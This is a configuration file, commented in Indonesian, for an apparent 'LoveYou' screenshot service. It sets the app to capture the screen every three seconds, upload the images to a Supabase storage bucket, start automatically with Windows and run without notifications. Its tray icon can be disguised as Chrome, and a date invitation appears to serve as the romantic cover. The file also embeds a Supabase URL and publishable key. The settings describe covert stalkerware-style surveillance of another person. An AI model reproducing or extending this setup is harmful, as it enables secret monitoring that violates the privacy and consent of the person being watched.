# ==============================================================================
# KONFIGURASI LOVEYOU SCREENSHOT SERVICE
# ==============================================================================

[SUPABASE]
# URL RESTful endpoint Supabase Anda
url = https://wqjfunxfngowxwdmyzyj.supabase.co
# Publishable / Anon API Key Supabase
key = sb_publishable_u2lBe4CRF_2XEqbkniBjbw_p0gGEXgZ
# Nama tabel di database Supabase untuk mencatat log screenshot
table_name = hasil_ss
# Nama bucket di Supabase Storage untuk menyimpan file gambar
bucket_name = screenshots

[CAPTURE]
# Jeda antar screenshot: 3 detik
interval_seconds = 3
# Folder lokal untuk menyimpan screenshot
local_folder = screenshots
# Simpan file di folder lokal secara permanen (true = jangan dihapus setelah upload)
keep_local_file = false
# Format gambar: jpg atau png
image_format = jpg
# Kualitas kompresi jpg (1 - 100)
jpg_quality = 80

[STARTUP]
# Otomatis daftarkan program ke Windows Startup (Registry & Startup Folder)
auto_start = true
# Nama di Registry Windows Startup: LoveYou
app_name = LoveYou

[TRAY]
# Notifikasi pop-up balon Windows (false agar tidak mengganggu setiap 3 detik)
notifications = false
# Ikon di System Tray Windows (heart.ico, chrome.ico, dll)
icon = heart.ico

[SECURITY]
# Pintasan darurat keyboard untuk mencabut startup & hapus data lokal
emergency_hotkey = true
hotkey_combo = Ctrl+Shift+F12

[CONTENT]
# Teks jadwal kencan dan waktu countdown yang ditampilkan di aplikasi & dikirim ke user_responses
date_invitation_text = SABTU, 5 DESEMBER 2026
date_countdown_target = 2026-12-05T12:00:00Z
tanggal_date = 2026-12-05
